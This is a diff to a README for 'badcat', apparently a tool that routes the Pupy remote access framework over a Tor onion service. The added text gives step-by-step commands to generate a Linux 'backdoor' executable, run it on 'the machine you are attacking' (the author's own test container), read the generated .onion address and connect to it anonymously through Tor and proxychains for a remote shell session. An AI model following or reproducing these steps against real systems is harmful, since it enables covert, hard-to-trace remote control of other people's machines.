@@ -82,7 +82,9 @@ git checkout dev
 git pull
 ```
 
-Now build it:
+Before building the integration code, think about your objectives. By default (at [this](https://github.com/yanmarques/badcat/blob/a5d245054f03b27a31096a08665b6d0a87f34d65/test-pupy/src/lib.rs#L98) line of code), badcat integration will start Tor with Tor's default `DataDirectory` and the `HiddenServiceDir` set to `hidden-service` directory. Modify the parameters to fit your desires.
+
+Then build it:
 
 ```bash
 cargo build --release -p test-pupy
@@ -129,3 +131,50 @@ You should see something like this:
 
 ![Pupy shell screenshot](https://user-images.githubusercontent.com/28604565/148851208-0213fd43-550d-44c9-86ba-f54d3ed174c4.png)
 
+Finally, build the payload:
+
+```bash
+>> gen -O linux -A x64 -o backdoor bind --port 8000 -t badcat
+```
+
+The resulting executable is at `./pupy/pupy/backdoor`. To fully test Pupy with badcat functionality, you need this `backdoor` executable, the integration shared library and Pupy shell of course.
+
+### 7. Start a Pupy Session with badcat
+
+First things first, prepare the machine you are attacking. This machine must have some weird libraries installed, with boring versions. So the best way I found was to use the container image, that created early under the name of `pupy-local`, derived from a Dockerfile I wrote myself.
+
+I started a container with an interactive shell and a mount for accessing the executable (`backdoor`) and the integration shared library (`libbadcat_pupy.so`) using the following command:
+
+```bash
+podman run --mount type=bind,src=$(pwd),target=/project -it pupy-local bash
+```
+
+Inside the container access the directory with both files. Then run the executable providing the directory where the shared library is located, so it is find in runtime. In my case, the shared library was in the same directory, so a dot (`.`) is used there.
+
+```bash
+LD_LIBRARY_PATH=. ./backdoor
+```
+
+Once the server is up and running, you need to connect through Tor using Pupy. In order to discover the generate Onion Service hostname, check on your current working directory the contents of the file at `hidden-service/hostname`. For instance, my server was:
+
+```bash
+$ cat ./hidden-service/hostname
+ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion
+```
+
+The next step is to connect to server using Pupy. First exit the Pupy shell if you are already in. Then install `tor` and `proxychains` if do not have them already. The idea is to have Tor client running and use `proxychains` to force all Pupy shell connections to travel Tor proxy. If you are not certain of how to configure Tor and `proxychains`, check [this](https://itigic.com/use-proxychains-and-tor-on-linux-to-be-anonymous/) article.
+
+Once Tor is running and `proxychains` is configure to use Tor Socks proxy, start Pupy shell and connect to your Onion Service:
+
+```bash
+proxychains python2 pupysh.py
+>> connect -c ithahibo6xgtlieneq5suimjxynpmjbircpf3q54ier5fkfpwiffvxyd.onion:8000 -t tcp_cleartext
+```
+
+Now be patient! 
+
+Generally it take around a minute to start a full session, it depends on your connection, Tor's network latency at the moment and so on. For me it has already took more than five minutes to start a full session. So again, be patient.
+
+Once the full session has started, one may see the following:
+
+IMAGE
